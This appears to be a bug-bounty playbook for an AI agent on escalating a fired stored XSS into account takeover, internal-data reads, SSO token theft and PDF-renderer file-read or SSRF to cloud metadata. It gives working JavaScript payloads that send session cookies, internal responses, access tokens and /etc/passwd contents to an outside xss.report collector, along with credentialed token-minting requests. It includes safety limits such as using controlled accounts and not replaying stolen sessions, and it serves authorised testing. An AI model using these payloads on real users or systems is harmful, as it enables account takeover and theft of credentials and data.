# Escalation — from "the callback fired" to payable impact

Apply the workspace safety boundary before every escalation: use controlled accounts, tenants, sessions, objects, and data. A real staff or third-party callback proves context but does not authorize collecting their cookie, token, DOM, storage, or PII. Reproduce sensitive consequences with controlled roles or stop at the policy boundary and record the exact withheld step.

## Contents

- Step 1 — pin the privileged origin (this sets severity)
- Step 2 — exfil the staff session (when `document.cookie` is readable)
- Step 3 — defeat HttpOnly with a same-session internal read (the key move)
- Step 3b — the origin is an SSO client → take the visitor's own session token
- Step 4 — invoice/receipt PDF & screenshot engines → file-read / SSRF / RCE
- Step 5 — self-XSS only counts once it fires for another user
- Severity anchors (grade honestly, then run `validation`)

A landed xss.report hit proves the primitive: your JavaScript ran inside a privileged, authenticated document you can never reach directly. That is rung 0 of the finding, not the finding. This file is the ladder from _fired_ to _paid_ — climbed **read-only, to your own channel, minimal** (safe-ladder rungs 1–3). The whole rung-1/2/3 sequence here is legitimate verification; the only thing that crosses into rung 5 (not attempted: ask d0x directly before executing) is _replaying_ a captured session to action another user or bulk-reading their data on prod.

## Step 1 — pin the privileged origin (this sets severity)

Read the callback **origin** host + path. Grade it:

- `admin.` / `/admin` / `staff.` / `/agent` / `/backoffice` / internal-tool subdomain → **admin/staff context** = top-tier.
- Support/agent ticket console → staff context, usually many agents = large blast radius.
- Headless-renderer worker origin (invoice/receipt/screenshot generator) → go to Step 4 (engine chain).
- Another **tenant's** origin (your stored value rendered in tenant B's console) → cross-tenant stored XSS, hand the tenancy angle to `tenant-isolation` too.

Note the staff role and how many users touch that dashboard — that is the blast-radius sentence in the report.

## Step 2 — exfil the staff session (when `document.cookie` is readable)

If the fired document's cookie is **not HttpOnly**, capturing the staff session token to _your own_ xss.report channel proves **staff account takeover = High** (the anchors' High tier owns "Stored XSS in admin context that steals an admin session"). The image beacon in `payloads.md` already ships `document.cookie`.

- **Proof = capture + decode.** Show the token is a live session by decoding its structure (JWT header/claims, or the session-cookie name matching the app's auth). That the fired script could read and exfil it is the complete proof of ATO — this is read-only, own-channel (rungs 1–2).
- **Do NOT replay it** to log in as the staff member, hit staff endpoints, or read live customer PII on prod. Replay is rung 5 — ask d0x directly with the exact request and rollback plan before executing. You do not need replay to prove takeover; the capture proves it.

## Step 3 — defeat HttpOnly with a same-session internal read (the key move)

HttpOnly hides the cookie from `document.cookie` but the fired script **still runs inside the admin's authenticated session** — so make it issue a credentialed request to an internal/admin endpoint and exfil the _response_. This is often the stronger High because it directly demonstrates internal-data disclosure, and it works even when cookie theft is blocked:

```js
// one internal record, through the admin's own session, to your channel.
// <internal-endpoint> = a route THIS target exposes to the fired staff context —
// read it off the DOM snapshot the callback captured, or take one handed over by
// js-source-to-sink (an admin user-list / object-read / config route).
fetch("<internal-endpoint>", { credentials: "include" })
  .then((r) => r.text())
  .then(
    (t) =>
      (new Image().src = "//xss.report/c/d0x/?src=internal-read&d=" + btoa(t)),
  );
```

Escalations of the same primitive (pick the cheapest that proves the class):

- Read **one** internal identifier — an identity route (`/me` / `/whoami` → admin username/role), an internal ticket `count`, an internal hostname from the DOM, or the **CSRF token** from the admin page. One is proof.
- With the CSRF token captured, you can _state_ that authenticated admin state- change is reachable — do **not** perform the write on prod (rung 5). Demonstrate a write only on a UAT/OAT instance or an object you own, then revert.
- **Minimal, always.** One record proves object-read; if you can read record N you can read N+1 — say so, don't fetch the table (rung 3). Bulk-dumping the customer/ ticket table through the fired session is the destructive version — nothing blocks it, and the program penalises it.

This step is the answer to "the session is HttpOnly so severity drops" — it does not drop; you read internal data through the session instead of stealing the cookie.

## Step 3b — the origin is an SSO client → take the visitor's own session token

Steps 2 and 3 assume the valuable session belongs to **staff** and that you wait for them. This one does not wait and does not need staff: on a marketing or app host that is a **registered client of the estate's identity provider**, every signed-in visitor's browser can produce a live access token _for that origin_. Code running there takes it. `HttpOnly` is irrelevant — the token was never in a cookie you needed to read.

It is the highest-converting escalation in the corpus for this class, and the victim is one click away rather than one staff workflow away.

### Qualify first — two enablers, both cheap to check

Neither is the bug; together they decide whether the bug pays.

1. **The origin ships no CSP — or ships it only in `Content-Security-Policy-Report-Only`.** Report-Only does not block; it reports. A team that added it believes it is protected. Check the real header name, not just that the string "CSP" appears:
   ```bash
   curl -sI "https://<origin>/" | grep -i 'content-security-policy'
   ```
   No `script-src` in an _enforcing_ header means an imported module or an injected `<script>` runs unrestricted.
2. **The identity provider answers this origin credentialed.** Registered silent-auth clients get `access-control-allow-origin: <that exact origin>` and `access-control-allow-credentials: true` from the token endpoint. That is what lets a script inside the origin mint a token with the ambient session cookie — from anywhere else the same call is refused.

### Any of three doors reaches the same room

The entry vector does not change the payoff, so recognise all three:

- **A parameter in the authority position of a dynamically imported module** — `../../js-source-to-sink/references/code-sinks.md` §1b owns the recognition and the suffix-truncation payloads (`%23`, `%2f`, a satisfied `includes()` branch).
- **A parameter written into an inline `<script>` string literal with no output encoding** — a raw `"` terminates the literal. Classic reflected XSS; the only thing that makes it Critical instead of Low is _this_ origin holding _that_ token.
- **An unanchored URL-allowlist regex** that decides whether the caller's credentials are attached to an outbound fetch — `../../broken-access-control/references/plays.md` §7 owns that one.

### Take the token — two paths, prefer the first

```js
// (a) it is already in the page. The app initialised the identity client on load,
//     so the live token is readable with zero network traffic.
const t = window.<identityClient>.getAccessToken();   // { token, expire, sid }
const p = await window.<identityClient>.getProfile(); // email, real name, user id, org

// (b) mint it. Works because the IdP allowlists this origin for credentialed
//     cross-origin reads; the victim's ambient session cookie does the rest.
fetch('https://<idp-host>/<token-endpoint>', {
  method: 'POST', credentials: 'include',
  headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
  body: 'client_id=<from the page config>&scope=<from the page config>'
}).then(r => r.json());   // -> access_token + the identity fields
```

Path (a) is quieter and proves the same thing. Read the client id and scope list out of the page's own configuration object — `js-source-to-sink` pass 2b will have them if you ran it.

**What the token is worth, and why it is not "just an XSS":** it authenticates to the whole estate as the victim, it typically carries a long list of scopes and a lifetime measured in hours, and the accompanying profile hands over verified email, real name, account id and owning organisation. That is impersonation, not information disclosure — grade it accordingly.

### Safe ladder for this step

- **Rung 1 — your own token.** Sign in as yourself, fire your own payload, exfil **your own** token to **your own** collector, and decode it to show it is live (expiry, scopes, the `sub` matching you). That single capture proves the origin leaks whoever visits, and it is the whole finding.
- **Rung 2 — your second account as the victim.** Plant the link as account A, open it as account B, capture B's token. Both accounts are yours.
- **Never replay a captured token to act as that user on prod** — decoding it already proves takeover. Replay is rung 5: not attempted, ask d0x directly before executing.
- Report the token **class**, never the raw value: the header/claims and the scope count, with the token redacted, plus a rotation note.

### Evidence that makes it reproduce

- The **enforcing-header check**: the `curl -I` showing no CSP, or only Report-Only.
- The **exact one-click URL** with the parameter payload, and the byte-for-byte module/script the origin fetched from your host.
- Your **server log line** proving the victim origin fetched attacker-controlled code, with its timestamp next to the page load.
- The **decoded token** (redacted) and the profile field _names_ returned — enough to show identity was recovered, without publishing the victim's data.
- The **negative control**: the same URL with a benign parameter value, showing the page loads its intended module and nothing is fetched from your host.
- If a preflight is involved, note it — see the reproduction trap in `../../broken-access-control/references/plays.md` §7: a collector that does not answer `OPTIONS` permissively makes a live vulnerability look absent.

### Corpus cases

Five submissions in d0x's corpus are this one class through different doors; read them for the report shape, not for the targets:

| ref | door | outcome | path under `~/Desktop/skills/personal-corpus/` |
| --- | --- | --- | --- |
| 3894684 | inline `<script>` literal, CSP Report-Only | critical · triaged | `h1/reports/3894684-adobe-triaged.md` |
| 3909155 | unanchored allowlist regex, shared document | high · triaged | `h1/reports/3909155-adobe-triaged.md` |
| 3900539 | param in module authority, `%2f` truncation | high · new | `h1/reports/3900539-adobe-new.md` |
| 3909271 | unanchored allowlist regex, author-named host | high · new | `h1/reports/3909271-adobe-new.md` |
| 3895022 | param in module authority, `#` truncation | high · duplicate | `h1/reports/3895022-adobe-duplicate.md` |

The duplicate is the instructive one: the same estate, the same payoff, a _third_ parameter — found after the first two were already reported. **When one of these lands, sweep the rest of the estate's bundles for sibling parameters before moving on**; that is where the second and third reports came from.

## Step 4 — invoice/receipt PDF & screenshot engines → file-read / SSRF / RCE

If the fired origin is a **headless-Chrome PDF/receipt/screenshot generator** (the invoice line-item / packing-slip / report input), the same stored injection runs in a server-side browser with far more reach than a staff session. Chain it:

- **Local file read** — `<iframe src=file:///etc/passwd></iframe>` or `fetch('file:///etc/passwd').then(r=>r.text()).then(t=>new Image().src='//xss.report/c/d0x/?src=pdf-lfi&d='+btoa(t))` (works when the renderer runs with `--allow-file-access-from-files` or similar). Reading a local file rendered into _your own_ invoice PDF is the read-only proof.
- **SSRF to cloud metadata** — `fetch('http://169.254.169.254/latest/meta-data/iam/security-credentials/').then(...)` from inside the renderer reaches IMDS. Hand this to `ssrf-safe` for the full IMDSv1/v2 + credential ladder.
- **RCE** — old/misconfigured wkhtmltopdf / headless-Chrome flags, or a server-side template behind the "invoice template" input, can reach code execution. Hand to `rce-hunting`.

The stored-XSS callback is the trigger; the file-read/SSRF/RCE is the payable escalation — report the chain, not just "script ran in the PDF worker."

## Step 5 — self-XSS only counts once it fires for another user

If the payload executes **only in your own session**, it is Self-XSS = not payable alone. Escalate by finding the **cross-user render** of the same stored field:

- The same `display name` / `company` / `bio` that "XSSes" your own settings page → find where an **admin** or **another member/tenant** renders it (admin user-list, audit log, shared workspace, tenant B's console). The xss.report hit from that non-you origin is the finding.
- A field that only round-trips to yourself and is never rendered to anyone else is a dead end — drop it and spray a field a privileged viewer actually sees.
- Chain candidate: a Self-XSS combined with a **login/CSRF or account-injection** bug that forces the payload into a victim's stored profile turns Self-XSS into stored XSS against that victim — pursue that chain before discarding.

## Severity anchors (grade honestly, then run `validation`)

- **Critical** — only the PDF-engine chain that leaves the XSS class: IMDS creds extracted, file-read of sensitive files, or RCE. Those anchor Critical on their own class (`../../validation/references/severity-anchors.md`: "RCE ... or file read of secrets", "SSRF chained to cloud metadata ... with extracted IAM creds").
- **High** — callback in admin/staff context with any of: the staff session cookie exfil'd (non-HttpOnly), a demonstrated same-session read of internal customer data, or — cookie HttpOnly — a same-session read of non-PII internal data (config, internal identifiers) with the internal-read primitive shown. The anchors grade "Stored XSS in admin context that steals an admin session" **High** (`../../validation/references/severity-anchors.md`, High tier), and `report-writing`'s worked vector for it scores 7.6. Do not file it Critical — the validator downgrades it.
- **Medium** — callback in a privileged-but-limited context (e.g. a scoped SaaS support tool), no session access, limited/no internal-data read.
- **Low / Informational** — callback only from a sandbox/preview or a same-origin non-privileged echo with no privileged data. Do **not** submit; keep spraying.

Do not inflate a bare "callback fired" into a Critical without the Step-2/3/4 impact. Do not deflate a real HttpOnly hit to "informational" — get the Step-3 internal read and it is a High. Gate every High/Critical with `validation`, then draft with `report-writing`.
